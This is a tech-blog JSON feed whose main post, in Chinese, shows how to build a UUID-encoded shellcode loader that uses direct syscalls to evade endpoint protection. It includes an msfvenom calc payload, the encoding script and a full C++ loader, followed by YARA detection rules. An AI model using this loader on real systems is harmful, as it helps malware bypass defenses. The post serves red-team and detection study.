{
  "version": "https://jsonfeed.org/version/1",
  "title": "Cymetrics Tech Blog",
  "home_page_url": "https://tech-blog.cymetrics.io",
  "feed_url": "https://tech-blog.cymetrics.io/feed/feed.json",
  "description": "Cymetrics Tech Blog",
  "author": {
    "name": "Cymetrics Tech Blog",
    "url": ""
  },
  "items": [{
      "id": "https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/",
      "url": "https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/",
      "title": "跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader",
      "content_html": "<!-- summary -->\n<p>在資安世界的紅藍對抗像極了貓捉老鼠遊戲</p>\n<p><strong>紅隊</strong> 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限</p>\n<p><strong>藍隊</strong> 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈</p>\n<p>今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid shellcode loader</p>\n<!-- summary -->\n<p>UUID Shellcode 早在 2017 年就有被研究員提出，在 2021 年 NCCGroup 發表了 <a href=\"https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\">Lazarus APT Group</a> 使用 UUID Shellcode 的相關技術，之後更衍伸出 ipv6 與 mac address 格式的 shellcode</p>\n<p>uuid 格式長得像下面這樣，中間為 <code>-</code> 分隔</p>\n<pre class=\"language-diff\"><code class=\"language-diff\">c534401d-b8f0-4880-b4ee-f68bdcaa60c9</code></pre>\n<p>每個 char 都是 0-f 組成，剛好可以對應到 shellcode 的 hex</p>\n<p><img src=\"/img/posts/zet/uuid-shellcode/uuid-format.png\" alt=\"project setup\"></p>\n<h2 id=\"%E7%94%A2%E7%94%9F-uuid-shellcode\"><a class=\"direct-link\" href=\"#%E7%94%A2%E7%94%9F-uuid-shellcode\">#</a> 產生 UUID Shellcode</h2>\n<p>首先簡單使用 metasploit framework 產生測試的小算盤 shellcode 在過濾一下 null byte</p>\n<pre class=\"language-diff\"><code class=\"language-diff\">msfvenom -p windows/x64/exec CMD=calc.exe -b '\\x00' -f py</code></pre>\n<p>利用 python 內建的 UUID lib 產生字串</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> uuid<br><br>buf <span class=\"token operator\">=</span>  <span class=\"token string\">b\"\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xdd\\xff\\xff\\xff\\x48\\x8d\\x05\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xef\\xff\\xff\\xff\\x48\\xbb\\x75\\x7a\\x57\\xe8\\x7a\\x66\\xe0\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x6d\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x89\\x32\\xd4\\x0c\\x8a\\x8e\\x20\\x6d\\x75\\x7a\\x16\\xb9\\x3b\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x36\\xb2\\x3c\\x23\\x32\\x66\\x3a\\x1f\\x2e\\x6b\\x3f\\x15\\x32\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xdc\\xba\\x62\\x2e\\x6b\\x3f\\x55\\x32\\xdc\\x9a\\x2a\\x2e\\xef\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xda\\x3f\\x30\\x1a\\xd9\\xb3\\x2e\\xd1\\xad\\xd9\\x46\\x36\\x94\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x78\\x4a\\xc0\\x2c\\xb4\\xb3\\x5a\\xa9\\x7b\\xa7\\x02\\x80\\x27\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x3b\\x06\\xa0\\xf1\\x34\\xc0\\xe6\\x37\\x46\\x1f\\xe9\\xaa\\xed\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x60\\xe5\\x75\\x7a\\x57\\xa0\\xff\\xa6\\x94\\x0a\\x3d\\x7b\\x87\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xb8\\xf1\\x2e\\xf8\\x29\\xfe\\x3a\\x77\\xa1\\x7b\\xb6\\x03\\x3b\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x3d\\x85\\x9e\\xa9\\xf1\\x52\\x68\\x25\\x74\\xac\\x1a\\xd9\\xb3\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x2e\\xd1\\xad\\xd9\\x3b\\x96\\x21\\x77\\x27\\xe1\\xac\\x4d\\x9a\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x22\\x19\\x36\\x65\\xac\\x49\\x7d\\x3f\\x6e\\x39\\x0f\\xbe\\xb8\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x29\\xfe\\x3a\\x73\\xa1\\x7b\\xb6\\x86\\x2c\\xfe\\x76\\x1f\\xac\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xf1\\x26\\xfc\\x24\\x74\\xaa\\x16\\x63\\x7e\\xee\\xa8\\x6c\\xa5\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x3b\\x0f\\xa9\\x22\\x38\\xb9\\x37\\x34\\x22\\x16\\xb1\\x3b\\x3c\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xa8\\xee\\x99\\x5a\\x16\\xba\\x85\\x86\\xb8\\x2c\\x2c\\x20\\x1f\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x63\\x68\\x8f\\xb7\\x92\\x8a\\x85\\x0a\\xa0\\xc0\\x67\\xe0\\x6d\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x75\\x7a\\x57\\xe8\\x7a\\x2e\\x6d\\xe0\\x74\\x7b\\x57\\xe8\\x3b\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xdc\\xd1\\xe6\\x1a\\xfd\\xa8\\x3d\\xc1\\x96\\x55\\xcf\\x23\\x3b\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\xed\\x4e\\xef\\xdb\\x7d\\x92\\xa0\\x32\\xd4\\x2c\\x52\\x5a\\xe6\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x11\\x7f\\xfa\\xac\\x08\\x0f\\x63\\x5b\\x2a\\x66\\x08\\x38\\x82\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x7a\\x3f\\xa1\\xe4\\xaf\\x85\\x82\\x8b\\x1b\\x0a\\x83\\x43\\x10\"</span><br>buf <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x02\\x32\\xe8\\x7a\\x66\\xe0\\x6d\"</span><br><br><br><span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span> <span class=\"token number\">16</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>    nop <span class=\"token operator\">=</span>  <span class=\"token string\">b\"\\x90\"</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>    buf <span class=\"token operator\">=</span> nop <span class=\"token operator\">+</span> buf<br><br><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\"'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>UUID<span class=\"token punctuation\">(</span>bytes_le<span class=\"token operator\">=</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\"'</span><span class=\"token punctuation\">)</span><br></code></pre>\n<p>產生出來的UUID會是</p>\n<pre class=\"language-diff\"><code class=\"language-diff\">\"c9314890-8148-dde9-ffff-ff488d05efff\"<br>\"bb48ffff-7a75-e857-7a66-e06d48315827\"<br>...<br>...</code></pre>\n<p>不能對齊 16 byte 的話前面用 <strong>nop</strong> 填充</p>\n<h2 id=\"%E5%9F%B7%E8%A1%8C-shellcode\"><a class=\"direct-link\" href=\"#%E5%9F%B7%E8%A1%8C-shellcode\">#</a> 執行 Shellcode</h2>\n<p>在 NCC 發表的文章中有範例程式，看到其中使用了兩個 API <code>UuidFromStringA</code> + <code>EnumSystemLocalA</code> 來實現 shellcode 還原與執行，<code>UuidFromStringA</code> 負責把UUID 格式的字串轉為 byte code，再利用 <code>EnumSystemLocalA</code> 的 callback 特性來執行 shellcode</p>\n<h3 id=\"direct-system-calls\"><a class=\"direct-link\" href=\"#direct-system-calls\">#</a> Direct system calls</h3>\n<p>這邊來結合 <a href=\"https://github.com/jthuraisamy/SysWhispers\">SysWhispers</a> 製作看看 direct system calls UUID shellcode loader，SysWhispers 是基於 <a href=\"https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\">Cneelis blog 文章</a> 直接使用 syscall 可以防止 user mode hook 的 library，後來也釋出了 <a href=\"https://github.com/jthuraisamy/SysWhispers2\">SysWhispers2</a> 參考 <a href=\"https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/\">MDSec Blog</a> 中的技術使用不同的方式產生 asm code 減少大小，還可以混淆 function string</p>\n<p>先把一些常用的 syscall export 出來，會產生出 <code>.h</code> 跟 <code>.asm</code> 檔，跟著 project README 設定一下，應該就可以正常編譯了</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">py .<span class=\"token punctuation\">\\</span>syswhispers.py --preset common -o syscalls_common</code></pre>\n<p><img src=\"/img/posts/zet/uuid-shellcode/project-files.png\" alt=\"project setup\"></p>\n<p>這邊 <code>uuid-shellcode.cpp</code> 偷懶一下 就單純用一個 <code>NtAllocateVirtualMemory</code> system call 試試效果就好</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Rpc.h></span></span><br><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span><br><br><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span><br><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span><br><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span><br><br><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"syscalls_common.h\"</span></span><br><br><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"Rpcrt4.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span><br><br><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">const</span> vector<span class=\"token operator\">&lt;</span>string<span class=\"token operator\">></span> uuids<span class=\"token punctuation\">{</span><br>    <span class=\"token string\">\"c9314890-8148-dde9-ffff-ff488d05efff\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"bb48ffff-7a75-e857-7a66-e06d48315827\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"fff82d48-ffff-f4e2-8932-d40c8a8e206d\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"b9167a75-363b-3cb2-2332-663a1f2e6b3f\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"badc3215-2e62-3f6b-5532-dc9a2a2eefda\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"d91a303f-2eb3-add1-d946-3694784ac02c\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"a95ab3b4-a77b-8002-273b-06a0f134c0e6\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"e91f4637-edaa-e560-757a-57a0ffa6940a\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"b8877b3d-2ef1-29f8-fe3a-77a17bb6033b\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"a99e853d-52f1-2568-74ac-1ad9b32ed1ad\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"21963bd9-2777-ace1-4d9a-22193665ac49\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"396e3f7d-be0f-29b8-fe3a-73a17bb6862c\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"ac1f76fe-26f1-24fc-74aa-16637eeea86c\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"a90f3ba5-3822-37b9-3422-16b13b3ca8ee\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"ba165a99-8685-2cb8-2c20-1f63688fb792\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"a00a858a-67c0-6de0-757a-57e87a2e6de0\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"e8577b74-dc3b-e6d1-1afd-a83dc19655cf\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"4eed3b23-dbef-927d-a032-d42c525ae611\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"08acfa7f-630f-2a5b-6608-38827a3fa1e4\"</span><span class=\"token punctuation\">,</span><br>    <span class=\"token string\">\"8b8285af-0a1b-4383-1002-32e87a66e06d\"</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br><br><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  LPVOID exec <span class=\"token operator\">=</span> <span class=\"token keyword\">nullptr</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">auto</span> len <span class=\"token operator\">=</span> uuids<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span><br>  <span class=\"token function\">NtAllocateVirtualMemory</span><span class=\"token punctuation\">(</span><span class=\"token function\">GetCurrentProcess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>exec<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>len<span class=\"token punctuation\">,</span> MEM_COMMIT<span class=\"token punctuation\">,</span><br>                          PAGE_EXECUTE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>  DWORD_PTR hptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>exec<span class=\"token punctuation\">;</span><br><br>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span><span class=\"token operator\">&amp;</span> uuid <span class=\"token operator\">:</span> uuids<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    RPC_STATUS status <span class=\"token operator\">=</span> <span class=\"token function\">UuidFromStringA</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>RPC_CSTR<span class=\"token punctuation\">)</span>uuid<span class=\"token punctuation\">.</span><span class=\"token function\">c_str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>UUID<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>hptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>status <span class=\"token operator\">!=</span> RPC_S_OK<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    hptr <span class=\"token operator\">+=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>exec<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>下斷點可以看到 <code>UuidFromStringA</code> 還原後的 shellcode 在記憶體中</p>\n<p><img src=\"/img/posts/zet/uuid-shellcode/uuid-in-memory.png\" alt=\"uuid decode in memory\"></p>\n<p><img src=\"/img/posts/zet/uuid-shellcode/uuid-calc.png\" alt=\"calc\"></p>\n<p>更多其他利用：</p>\n<ul>\n<li><a href=\"https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/\">C# Dynamic-Invoke UUID shellcode Execution</a>\n<ul>\n<li><a href=\"https://thewover.github.io/Dynamic-Invoke/\">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</a></li>\n<li><a href=\"https://github.com/TheWover/DInvoke\">github DInvoke</a></li>\n</ul>\n</li>\n<li><a href=\"https://github.com/boku7/Ninja_UUID_Runner\">Ninja UUID Runner</a> 利用 HellsGate syscall 減少在 User mode 被檢測的風險</li>\n<li><a href=\"http://ropgadget.com/posts/abusing_win_functions.html\">native Windows functions for shellcode execution</a> 利用更多 windows native function callback 執行 shellcode</li>\n<li><a href=\"https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection\">Callback_Shellcode_Injection</a></li>\n<li><a href=\"https://github.com/mai1zhi2/SysWhispers2_x86\">x86 SysWhispers2</a> 支援 x86 的 SysWhispers2 (SysWhispers 只支援 64)</li>\n<li><a href=\"https://github.com/icyguider/Shhhloader\">SysWhispers Shellcode Loader</a></li>\n<li><a href=\"https://jmpesp.me/malware-analysis-syscalls-example/\">MALWARE ANALYSIS: SYSCALLS</a> 如何 debug 分析 direct syscall 的 malware</li>\n</ul>\n<p>更多其他 shellcode 格式 可以參考 <a href=\"https://github.com/midisec/BypassAnti-Virus/tree/main/callback\">Midi Wan github</a>:</p>\n<p>ipv6 format</p>\n<pre class=\"language-diff\"><code class=\"language-diff\">\"fc48:83e4:f0e8:c800:0:4151:4150:5251\"<br>\"5648:31d2:6548:8b52:6048:8b52:1848:8b52\"<br>\"2048:8b72:5048:fb7:4a4a:4d31:c948:31c0\"<br>\"ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed\"</code></pre>\n<p>mac address format</p>\n<pre class=\"language-diff\"><code class=\"language-diff\">\"FC-48-83-E4-F0-E8\",<br>\"C8-00-00-00-41-51\",<br>\"41-50-52-51-56-48\",<br>\"31-D2-65-48-8B-52\",<br>\"60-48-8B-52-18-48\",<br>\"8B-52-20-48-8B-72\"</code></pre>\n<h2 id=\"%E5%81%B5%E6%B8%AC\"><a class=\"direct-link\" href=\"#%E5%81%B5%E6%B8%AC\">#</a> 偵測</h2>\n<p>利用 yara 寫些 patten，針對 POC 中主要使用的 API <code>UuidFromString</code>  加上 超過一定數量 UUID 的特徵簡單寫個 yara rule，也可以再加上 API <code>HeapAlloc</code> + <code>EnumSystemLocales</code></p>\n<p>簡單的範例大概如下：</p>\n<pre class=\"language-yml\"><code class=\"language-yml\">rule uuid_shellcode_loader <span class=\"token punctuation\">{</span><br>    <span class=\"token key atrule\">meta</span><span class=\"token punctuation\">:</span><br>        description = \"shellcode through UUID\"<br>        date = \"02/16/2022\"<br>        author = \"Zet\"<br><br>    <span class=\"token key atrule\">strings</span><span class=\"token punctuation\">:</span><br>        $mz = \"MZ\"<br>        $a = \"UuidFromString\"<br>        $uuid = /<span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">-</span>9a<span class=\"token punctuation\">-</span>f<span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token number\">8</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">-</span>9a<span class=\"token punctuation\">-</span>f<span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">-</span>9a<span class=\"token punctuation\">-</span>f<span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">-</span>9a<span class=\"token punctuation\">-</span>f<span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">-</span>9a<span class=\"token punctuation\">-</span>f<span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span>/ ascii<br><br>    <span class=\"token key atrule\">condition</span><span class=\"token punctuation\">:</span><br>\t\t$mz at 0<br>        and $a<br>        and (<span class=\"token comment\">#uuid >7)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>另外針對 syswhispers2 lib 我們可以針對產生出來的 ASM 檔寫一些規則，假如要在通用一點的話或許可以在研究 lib 中用於產生 <code>.h</code> <code>.c</code> 的 <a href=\"https://github.com/jthuraisamy/SysWhispers2/tree/main/data\">base template</a> 寫規則</p>\n<pre class=\"language-yml\"><code class=\"language-yml\">rule syswhispers2 <span class=\"token punctuation\">{</span><br>    <span class=\"token key atrule\">meta</span><span class=\"token punctuation\">:</span><br>        description = \"syswhispers2 <span class=\"token punctuation\">-</span> direct system calls lib\"<br>        date = \"02/16/2022\"<br>        author = \"Zet\"<br><br>    /*<br>    0x140002370 48894C2408                    mov qword ptr <span class=\"token punctuation\">[</span>rsp + 8<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> rcx<br>    0x140002375 4889542410                    mov qword ptr <span class=\"token punctuation\">[</span>rsp + 0x10<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> rdx<br>    0x14000237a 4C89442418                    mov qword ptr <span class=\"token punctuation\">[</span>rsp + 0x18<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> r8<br>    0x14000237f 4C894C2420                    mov qword ptr <span class=\"token punctuation\">[</span>rsp + 0x20<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> r9<br>    0x140002384 4883EC28                      sub rsp<span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><br>    0x140002388 B91EC995DD                    mov ecx<span class=\"token punctuation\">,</span> <span class=\"token number\">0xdd95c91e</span><br>    0x14000238d E85EF1FFFF                    call 0x1400014f0<br>    0x140002392 4883C428                      add rsp<span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><br>    0x140002396 488B4C2408                    mov rcx<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rsp + 8<span class=\"token punctuation\">]</span><br>    0x14000239b 488B542410                    mov rdx<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rsp + 0x10<span class=\"token punctuation\">]</span><br>    0x1400023a0 4C8B442418                    mov r8<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rsp + 0x18<span class=\"token punctuation\">]</span><br>    0x1400023a5 4C8B4C2420                    mov r9<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rsp + 0x20<span class=\"token punctuation\">]</span><br>    0x1400023aa 4C8BD1                        mov r10<span class=\"token punctuation\">,</span> rcx<br>    0x1400023ad 0F05                          syscall<br>    0x1400023af C3                            ret<br>    <span class=\"token important\">*/</span><br><br>    <span class=\"token key atrule\">strings</span><span class=\"token punctuation\">:</span><br>        $mz = \"MZ\"<br>        $s = <span class=\"token punctuation\">{</span><br>            48 89 4C 24 08<br>            48 89 54 24 10<br>            4C 89 44 24 18<br>            4C 89 4C 24 20<br>            48 83 EC 28<br>            B9 <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span> <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span> <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span> <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span><br>            E8 <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span> <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span> <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span> <span class=\"token punctuation\">?</span><span class=\"token punctuation\">?</span><br>            48 83 C4 28<br>            48 8B 4C 24 08<br>            48 8B 54 24 10<br>            4C 8B 44 24 18<br>            4C 8B 4C 24 20<br>            4C 8B D1<br>            0f 05<br>            c3<br>        <span class=\"token punctuation\">}</span><br><br>    <span class=\"token key atrule\">condition</span><span class=\"token punctuation\">:</span><br>        $mz at 0<br>        and <span class=\"token comment\">#s > 3</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>我們可以把 yara 上傳到 <a href=\"https://riskmitigation.ch/yara-scan/index.html\">Yara Scan Service<br>\n</a> 找到一些相關手法的利用</p>\n<p><img src=\"/img/posts/zet/uuid-shellcode/hunt.png\" alt=\"hunt\"></p>\n<h2 id=\"references\"><a class=\"direct-link\" href=\"#references\">#</a> References</h2>\n<ul>\n<li><a href=\"https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala\">https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala</a></li>\n<li><a href=\"https://lowery.tech/building-a-custom-shellcode-loader-with-syswhispers-to-utilise-direct-syscalls/\">https://lowery.tech/building-a-custom-shellcode-loader-with-syswhispers-to-utilise-direct-syscalls/</a></li>\n<li><a href=\"https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/\">https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/</a></li>\n<li><a href=\"https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html\">https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html</a></li>\n<li><a href=\"https://github.com/am0nsec/HellsGate\">https://github.com/am0nsec/HellsGate</a></li>\n</ul>\n",
      "date_published": "2022-03-01T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-4/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-4/",
      "title": "Android App 逆向入門之四：使用 Frida 進行動態分析",
